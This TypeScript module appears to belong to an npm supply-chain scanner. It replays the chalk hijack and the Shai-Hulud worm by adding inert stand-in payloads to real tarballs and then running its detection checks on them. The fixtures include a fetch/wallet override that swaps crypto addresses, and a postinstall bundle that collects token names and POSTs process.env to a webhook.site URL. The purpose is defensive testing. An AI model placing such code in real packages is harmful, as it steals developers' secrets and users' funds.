import { analyzeProject, verdictOf } from './analyze.js';
import { getManifest } from './net.js';
import { installEntryFiles, scanFiles, scanInstallScript } from './scan.js';
import { verifyAgainstSource } from './source.js';
import { readTarball } from './tarball.js';
import type { Finding, PackageReport } from './types.js';

/**
 * Attack replays: take a real, genuine release, apply the same kind of change a real attack made,
 * and run the normal checks on the result. The injected code is an inert stand-in that is only
 * ever scanned as text, never executed. It mimics the behaviours the real payloads had, so the
 * detection is honest: the same rules fire that would fire on the real thing.
 */
export interface Scenario {
  id: string;
  title: string;
  when: string;
  story: string;
  name: string;
  genuine: string;
  hijackedVersion: string;
  scripts?: Record<string, string>;
  inject: { path: string; append?: string; create?: string }[];
}

export const SCENARIOS: Scenario[] = [
  {
    id: 'chalk',
    title: 'chalk hijack',
    when: '8 Sept 2025',
    story:
      'A phished maintainer account published chalk 5.6.1, debug 4.4.2 and 16 other packages with code that hooked the browser wallet and network calls to swap crypto addresses. About 2.6 billion weekly downloads were affected. The versions were live for roughly two hours.',
    name: 'chalk',
    genuine: '5.6.2',
    hijackedVersion: '5.6.1',
    inject: [
      {
        path: 'source/index.js',
        append: [
          '',
          '// replayed stand-in for the injected payload (inert)',
          "const _0x5c1e = typeof window !== 'undefined' && window.ethereum;",
          'if (_0x5c1e) { window.ethereum.request = async function (args) { return swapRecipient(args); }; }',
          'globalThis.fetch = async function (input, init) { return rewriteAddresses(input, init); };',
        ].join('\n'),
      },
    ],
  },
  {
    id: 'shai-hulud',
    title: 'Shai-Hulud worm',
    when: '15 Sept 2025',
    story:
      'A self-spreading worm used stolen npm tokens to republish packages, starting with @ctrl/tinycolor, with a new postinstall script. On install it ran TruffleHog to harvest tokens and cloud keys, sent them to a webhook, and used any npm token it found to infect more packages.',
    name: '@ctrl/tinycolor',
    genuine: '4.1.0',
    hijackedVersion: '4.1.1',
    scripts: { postinstall: 'node bundle.js' },
    inject: [
      {
        path: 'bundle.js',
        create: [
          '// replayed stand-in for the Shai-Hulud bundle (inert)',
          "const { execSync } = require('child_process');",
          "const secrets = scan(['trufflehog', '.npmrc', 'NPM_TOKEN', 'GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY']);",
          "fetch('https://webhook.site/replay-demo', { method: 'POST', body: JSON.stringify(process.env) });",
        ].join('\n'),
      },
    ],
  },
];

export interface ReplayResult {
  scenario: Scenario;
  genuine: PackageReport;
  hijacked: PackageReport;
}

export async function replayAttack(id: string, onStage: (s: string) => void = () => {}): Promise<ReplayResult> {
  const sc = SCENARIOS.find((s) => s.id === id);
  if (!sc) throw new Error(`Unknown scenario ${id}`);

  onStage(`Checking the genuine ${sc.name}@${sc.genuine}`);
  const real = await analyzeProject(`${sc.name}@${sc.genuine}`, [{ name: sc.name, spec: sc.genuine, direct: true }], { deep: true });
  const genuine = real.packages[0];

  onStage(`Re-creating the ${sc.title} on the real tarball`);
  const manifest = await getManifest(sc.name, sc.genuine);
  if (!manifest) throw new Error(`${sc.name}@${sc.genuine} is not on npm`);
  const files = await readTarball(manifest.dist.tarball, manifest.dist.integrity);
  for (const inj of sc.inject) {
    const f = files.find((x) => x.path === inj.path);
    if (inj.create != null) files.push({ path: inj.path, size: inj.create.length, text: inj.create });
    else if (f && inj.append) f.text = (f.text || '') + inj.append;
  }
  const scripts = { ...(manifest.scripts || {}), ...(sc.scripts || {}) };
  const hijackedManifest = { ...manifest, version: sc.hijackedVersion, scripts };
  const installFiles = installEntryFiles(scripts);

  onStage('Running the same checks on the hijacked release');
  const findings: Finding[] = [];
  findings.push(...scanInstallScript(scripts));
  const hadInstall = ['preinstall', 'install', 'postinstall'].some((k) => manifest.scripts?.[k]);
  const hasInstall = ['preinstall', 'install', 'postinstall'].some((k) => scripts[k]);
  const signals: string[] = ['published minutes ago'];
  if (hasInstall && !hadInstall) {
    signals.push('install script added');
    findings.push({
      code: 'install-added',
      severity: 'review',
      title: `Install script added in ${sc.hijackedVersion}`,
      detail: `${sc.genuine} ran nothing on install. This version does. Worms like Shai-Hulud spread by adding a postinstall.`,
    });
  }
  findings.push({ code: 'fresh', severity: 'review', title: 'Published 4 min ago', detail: 'Most malicious releases are caught and pulled within days.' });
  findings.push(...scanFiles(files, installFiles).findings);
  const src = await verifyAgainstSource(hijackedManifest, files, installFiles);
  findings.push(...src.findings);
  if (src.check.status === 'differs' || src.findings.some((f) => f.code === 'source-install-not-in-git')) signals.push('code not in the source repo');
  if (signals.length >= 2) {
    findings.push({
      code: 'hijack-pattern',
      severity: 'danger',
      title: 'Looks like a hijacked release',
      detail: 'Several takeover signals at once. Pin the previous version until the maintainers confirm this release.',
      evidence: signals,
    });
  }
  const order = { danger: 0, review: 1, info: 2, good: 3 } as const;
  findings.sort((a, b) => order[a.severity] - order[b.severity]);
  const hijacked: PackageReport = {
    name: sc.name,
    spec: sc.hijackedVersion,
    version: `${sc.hijackedVersion}`,
    direct: true,
    dev: false,
    verdict: verdictOf(findings),
    findings,
    meta: {
      ...genuine.meta,
      publishedAt: new Date(Date.now() - 4 * 60_000).toISOString(),
      provenance: false,
      integrity: undefined,
      source: { status: src.check.status, repo: src.check.repo, commit: src.check.commit, compared: src.check.compared, matched: src.check.matched, modified: src.check.modified.length, notInGit: src.check.notInGit.length },
    },
    scanned: true,
  };
  return { scenario: sc, genuine, hijacked };
}
